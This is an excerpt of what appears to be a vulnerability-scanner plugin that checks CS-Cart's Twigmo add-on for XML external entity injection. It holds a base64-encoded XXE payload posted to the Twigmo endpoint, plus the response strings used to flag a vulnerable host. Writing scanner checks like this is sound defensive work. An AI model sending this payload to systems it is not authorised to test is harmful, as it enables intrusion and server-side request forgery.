...
if(description){
	...
	script_dependencies( "gb_cscart_detect.sc" );
...
data = "action=add_to_cart&data=CjwhRE9DVFlQRSB0ZXN0aW5neHhlIFs8IUVOVElUWSB4eGUgU1lTVEVNICdodHRwOi8vMTI3LjAu" + "MC4xOjgwJyA%2BXT4KPGRvY3VtZW50Pgo8a2lsbGl0PiZ4eGU7PC9raWxsaXQ%2BCjwvZG9jdW1lbnQ%2BCg%3D%3D&format=xml";
req = http_post_put_req( port: port, url: dir + "/index.php?dispatch=twigmo.post", data: data, add_headers: make_array( "Content-Type", "application/x-www-form-urlencoded" ) );
res = http_keepalive_send_recv( port: port, data: req );
if(ContainsString( res, "twigmo_version" ) && ContainsString( res, "<status><![CDATA[OK]]></status>" )){
